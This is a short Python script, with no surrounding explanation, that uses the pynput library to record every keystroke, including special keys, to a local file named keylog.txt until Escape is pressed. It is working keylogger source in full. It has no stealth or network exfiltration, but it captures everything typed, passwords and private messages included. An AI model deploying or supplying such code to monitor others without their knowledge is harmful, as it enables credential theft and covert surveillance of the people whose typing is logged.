from pynput import keyboard

# Log file where keystrokes will be saved
LOG_FILE = "keylog.txt"

def on_press(key):
    try:
        # Record alphanumeric keys
        with open(LOG_FILE, "a") as file:
            file.write(f"{key.char}")
    except AttributeError:
        # Record special keys
        with open(LOG_FILE, "a") as file:
            file.write(f" [{key}] ")

def on_release(key):
    # Stop listener if escape key is pressed
    if key == keyboard.Key.esc:
        return False

# Start listening to keyboard inputs
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
